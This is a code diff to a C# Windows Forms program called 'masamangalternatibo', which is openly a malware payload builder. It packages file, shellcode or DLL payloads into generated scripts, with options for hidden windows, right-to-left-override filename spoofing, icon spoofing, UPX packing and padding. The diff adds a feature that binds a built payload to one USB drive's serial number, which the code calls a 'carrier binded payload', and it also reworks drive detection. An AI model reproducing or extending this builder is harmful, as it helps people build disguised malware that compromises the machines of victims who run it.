@@ -8,6 +8,7 @@ using System.Windows.Forms;
 using System.IO;
 using System.Drawing.IconLib;
 using System.Net;
+using System.Diagnostics;
 //using System.Runtime.InteropServices;
 
 namespace masamangalternatibo {
@@ -18,7 +19,7 @@ namespace masamangalternatibo {
         int payloadMode = 0; // 0 = File payload // 1 = Shell Code payload // 2 = Load DLL to rundll32
         string[] payloadData = new string[6]; //Stores the data from the textbox so the user can switch modes without losing the last settings Index 0-2: Stores the mode data // Index 3-4: Stores the arguments // Index 5: argument placeholder for shell mode (opposed for efficiency rather than doing heavy math and comparisons)
         string[] payloadFile = new string[2]; // Stores the data of ofdPayload.FileName incase the user switches modes // 0 = File Payload // 1 = DLL Payload
-        public bool[] excomp = { false, false}; // Acts as a switch if the external components exist or not // 0 = Icon Library // 1 = UPX
+        public bool[] excomp = { false, false, false}; // Acts as a switch if the external components exist or not // 0 = Icon Library // 1 = UPX // 2 = Get Drive Serial
         public bool isicon = false; //Keeps track if there's a selected / designated icon
         public int overflowCount = 20;
         string apth = Application.StartupPath;
@@ -29,9 +30,8 @@ namespace masamangalternatibo {
         }
 
         private void Form1_Load(object sender, EventArgs e) {
-            lblVersion.Text = "v" + globalClass.version;
             dbgmsg("Starting from: " + apth);
-
+            lblVersion.Text = "v" + globalClass.version;
             checkComponent(
                 "Compiler",
                 "compiler.exe",
@@ -66,6 +66,14 @@ namespace masamangalternatibo {
                 true
             );
 
+            excomp[2] = checkComponent(
+                "Get Drive Serial",
+                "getDriveSerial.exe",
+                "372kb",
+                "",
+                "This component is used to obtain a drive's serial number for creating carrier binded payloads."
+            );
+
             loadDrives();
 
             #if !(isdbg)
@@ -73,6 +81,8 @@ namespace masamangalternatibo {
                 tbPayload.ReadOnly = true;
                 tbSpoof.ReadOnly = true;
             #endif
+
+            if (excomp[2] == false) chkSerial.Enabled = false;
 
             dbgmsg("WARNING: Console Commands aren't filtered/check; They're executed directly and immidiately. Be cautious on executing commands.");
             dbgmsg("mA Ready! // Hover an item for more information!");
@@ -86,7 +96,7 @@ namespace masamangalternatibo {
         private void btnConsole_Click(object sender, EventArgs e) {
             string[] con = tbConsole.Text.Split(' ');
             switch ((con[0]).ToLower()) {
-                case "a": MessageBox.Show(imgFileIcon.Image == null ? "yes" : "no"); break;
+
                 case "setdrive":
                     drpDrives.Items.Add(con[1]);
                     drpDrives.SelectedIndex = drpDrives.Items.Count - 1;
@@ -151,9 +161,13 @@ namespace masamangalternatibo {
                 case "rtlo":
                     dbgmsg(globalClass.rtlo + con[1]);
                     break;
-                
+
+                case "getserial":
+                    dbgmsg("driveserial: " + getSerial(con[1]));
+                    break;
+
                 default:
-                    dbgmsg("Bad command! Available commands:\nsetdrive [driveletter]\nsetoverflowcount [integer]\nsetimagelocation [filepath]\nshowpayloadfile\noverflowdebugmsg\ncheckcomp [name] [filename] [size] [link] [desc]\nteststrformat [string] [data]\nformsetwidth [integer]\ncleanup\nshowallui\nrtlo [string]\ncls\nexit\n");
+                    dbgmsg("Bad command! Available commands:\nsetdrive [driveletter]\nsetoverflowcount [integer]\nsetimagelocation [filepath]\nshowpayloadfile\noverflowdebugmsg\ncheckcomp [name] [filename] [size] [link] [desc]\nteststrformat [string] [data]\nformsetwidth [integer]\ncleanup\nshowallui\nrtlo [string]\ngetserial [drive]\ncls\nexit\n");
                     break;
             }
             tbConsole.Text = "";
@@ -294,17 +308,10 @@ namespace masamangalternatibo {
                 Debug Message
          )
          --------------------------------------------------------------------------------------------------------
-         *An if logic is implemented to prevent the debug label from overflowing beyond the tool strip container
          *returns: nothing
         */
         private void dbgmsg(string a) {
             dbgRtb.Text = "•" + a + "\n" + dbgRtb.Text;
-            if (a.Length >= 70) {
-                lblDbg.Text = a.Remove(70, a.Length - 70) + "...";
-            }
-            else {
-                lblDbg.Text = a;
-            }
         }
 
         /*
@@ -393,8 +400,10 @@ namespace masamangalternatibo {
              *   7  - Hide/Show Payload Window (Macro | @SW_SHOW / @SW_HIDE)
              *   8  - Console command execution switch (String | /k or /c)
              *   9  - Type of payload (integer | 0 = payload / 2 = dll payload / 3 = shell code)
+             *   10 - Driver Serial Check (bool)
+             *   11 - Driver Serial to Check (String)
             */
-            string[] scriptData = new string[10];
+            string[] scriptData = new string[12];
 
             dbgmsg("Starting build...");
             dbgmsg("Importing template...");
@@ -426,9 +435,11 @@ namespace masamangalternatibo {
             scriptData[7] = (chkHidWin.Checked ? "@SW_HIDE":"@SW_SHOW");
             scriptData[8] = ((payloadMode == 0 && chkConsole.Checked) ? btnCommand.Text : "");
             scriptData[9] = payloadMode.ToString();
+            scriptData[10] = (chkSerial.Checked && excomp[2] ? "true" : "false");
+            scriptData[11] = (chkSerial.Checked && excomp[2] ? getSerial(drpDrives.GetItemText(drpDrives.SelectedItem)) : "0000000000");
 
             dbgmsg("Writing parsed script to memory...");
-            templateData = String.Format(templateData, scriptData[0], scriptData[1], scriptData[2], scriptData[3], scriptData[4], scriptData[5], scriptData[6], scriptData[7], scriptData[8], scriptData[9]);
+            templateData = String.Format(templateData, scriptData[0], scriptData[1], scriptData[2], scriptData[3], scriptData[4], scriptData[5], scriptData[6], scriptData[7], scriptData[8], scriptData[9], scriptData[10], scriptData[11]);
 
             if (payloadMode == 2) {
                 dbgmsg("Creating Payload placeholder...");
@@ -443,7 +454,7 @@ namespace masamangalternatibo {
             }
             else {
                 using (buildPayload _bp = new buildPayload()) {
-                    if (radOverflow.Checked) { _bp.overflowCount = overflowCount; }
+                    if (radOverflow.Checked) _bp.overflowCount = overflowCount;
 
                     if (radNone.Checked) {
                         _bp.spoofMode = 0;
@@ -487,27 +498,51 @@ namespace masamangalternatibo {
          Load Drives Function - Detects all the present drives in this computer by scanning directories.
          --------------------------------------------------------------------------------------------------
          *returns: nothing
-         * 
-         * TODO: Add checking if drive is available, exclude network folders, (option) use a flash drive library.
         */
         private void loadDrives() {
-            dbgmsg("Detecting drives...");
+            dbgmsg("Scanning for drives...");
             drpDrives.Items.Clear();
-            for (int i = 65; i <= 90; i++) {
-                if (Directory.Exists(((char)i) + ":\\") && i != 67) {
-                    drpDrives.Items.Add(((char)i)+ ":\\");
+            DriveInfo[] _di = DriveInfo.GetDrives();
+            foreach (DriveInfo drivenm in _di) {
+                if (drivenm.IsReady && drivenm.Name != @"C:\") {
+                    drpDrives.Items.Add(drivenm.Name);
                 }
             }
+            /* LEGACY *
+            for (int i = 65; i <= 90; i++) {
+                if (Directory.Exists(((char)i) + ":\\") && i != 67 ) {
+                        drpDrives.Items.Add(((char)i) + ":\\");
+                }
+            }
+            */
             if (drpDrives.Items.Count != 0) { drpDrives.SelectedIndex = 0; }
-            dbgmsg("Finished!");
         }
 
-        //========================================================================================================================================
- 
+        /*
+         * Get Drive Serial Function - a function that utilizes the "getDriveSerial.exe" component to obtain the drive's serial number
+         * ----------------------------------------------------------------------------------------------------------------------------
+         *  getSerial (
+         *          Drive Path (string)
+         *  )
+         * ----------------------------------------------------------------------------------------------------------------------------
+         * returns: string - The serial number of the drive
+         *          "error" - Component returned an error
+        */
+        private string getSerial(string gsdrive) {
+            string gscout = "";
+            dbgmsg("Utilizing getDriveSerial Component...");
+            ProcessStartInfo _gspsi = new ProcessStartInfo("getDriveSerial.exe", gsdrive);
+            _gspsi.RedirectStandardOutput = true;
+            _gspsi.UseShellExecute = false;
+            Process _phndl = Process.Start(_gspsi);
+            using (StreamReader _psr = _phndl.StandardOutput) gscout = _psr.ReadLine();
+            _phndl.WaitForExit();
+            return gscout;
+        }
+        
+        //Button Switch Mode - Allows the user to switch between payload modes
         private void btnSwitchMode_Click(object sender, EventArgs e) {
             payloadData[payloadMode] = tbPayload.Text; //Save the current payloadData to be displayed later
-
-            
 
             payloadMode++;
             if (payloadMode == 3) { payloadMode = 0; }
@@ -549,6 +584,14 @@ namespace masamangalternatibo {
                     break;
             }
             tbPayload.Text = payloadData[payloadMode]; //Display the data of the currently selected payloadMode
+        }
+
+        private void btnUpdPay_Click(object sender, EventArgs e) {
+            
+        }
+
+        private void btnUpdma_Click(object sender, EventArgs e) {
+
         }
 
         private void btnRefreshDrives_Click(object sender, EventArgs e) {
